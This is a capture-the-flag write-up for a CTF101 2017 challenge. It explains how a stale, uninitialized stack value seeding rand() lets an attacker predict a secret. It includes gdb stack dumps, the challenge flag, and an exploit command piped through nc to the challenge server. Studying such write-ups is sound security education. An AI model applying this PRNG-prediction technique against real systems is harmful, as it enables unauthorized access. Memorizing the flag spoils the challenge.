# CTF101 2017: Day 2 Challenge 5

## Type of challenge

- Psuedo-random generators
- Uninitalized variables

## Flag

```
ctf{mining_gold_like_goldfish}
```

---

## Exploit

```
./exploit | nc pwn.dystopia.sg 2468
```

### Notes

- `rand()` uses the value of `seed` as the seed, which is an uninitialized variable.

#### When exiting `create_miner` stack frame

- Size of stack = `100` + `4` + `4`:
    - Push `char name[100]`
    - Push `int seed`
    - Push `int id`
- We can see that the stack variables start after `0xffffd2dc`.
- After exiting, `$esp` is set to value of `$ebp`, which reduces it by `108` bytes.

```
(gdb) x/32xw $esp
0xffffd270:	0xf7faed60	0x5ae99de7	0x41414141	0x41414141
0xffffd280:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd290:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2d0:	0x41414141	0x41414141	0xffffd200	0x26eace00
0xffffd2e0:	0x08048987	0xffffd3a4	0xffffd2f8	0x080488e1
```

#### When entering `mine_gold` stack frame:

- Size of stack = `4` + `4` + `4`:
    - Push `int secret`
    - Push `int seed`
    - Push `int input`
- We know the address of `seed`, from the offset from what we found earlier. 
    - `print &seed` gives us `0xffffd2d4`
    - Contents of `0xffffd2d4` = `0x41414141` (or 1094795585 in decimal)

```
(gdb) x/8xw $esp
0xffffd2d0:     0x41414141      0x41414141      0xffffd200      0x26eace00
0xffffd2e0:     0x08048987      0xffffd3a4      0xffffd2f8      0x080488e6
```

- After `scanf` and `srand(seed)`:
    - We can see that `secret` (`0xffffd2d8`) is equal to `input` (`0xffffd2d0`).

```
(gdb) x/8xw $esp
0xffffd2d0:     0x79ef55a0      0x41414141      0x79ef55a0      0xc7d72900
0xffffd2e0:     0x08048987      0xffffd3a4      0xffffd2f8      0x080488e6
```

- We can predictably know the value of `rand()` if we know the seed value.
    - See `exploit.c` which uses the same seed value to generate a payload.
    - Actually, we can immediately extract out the value of `secret` from `gdb` itself, but let's assume that the seed is slightly more complicated (involves `time()` or something), so we create a C program to generate a payload which can be piped to `nc`.
